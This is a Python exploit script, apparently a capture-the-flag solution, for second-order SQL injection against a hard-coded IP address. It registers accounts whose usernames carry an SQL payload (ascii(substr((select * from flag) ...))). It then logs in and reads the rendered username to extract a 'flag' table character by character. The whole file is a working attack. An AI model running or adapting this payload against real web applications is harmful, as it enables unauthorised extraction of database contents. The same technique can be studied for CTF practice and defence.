import requests
import logging
import re
from time import sleep

# 二次注入  登录

def search():
    flag = ''
    url = 'http://61.147.171.105:53574/'
    url1 = url+'register.php'
    url2 = url+'login.php'
    for i in range(100):
        sleep(0.3)#
        data1 = {"email" : "1234{}@123.com".format(i), "username" : "0'+ascii(substr((select * from flag) from {} for 1))+'0;".format(i), "password" : "123"}
        data2 = {"email" : "1234{}@123.com".format(i), "password" : "123"}
        r1 = requests.post(url1, data=data1)
        r2 = requests.post(url2, data=data2)
        res = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r2.text)
        res1 = re.search(r'\d+', res.group())
        flag = flag+chr(int(res1.group()))
        print(flag)
    print("final:"+flag)

if __name__ == '__main__':
    search()
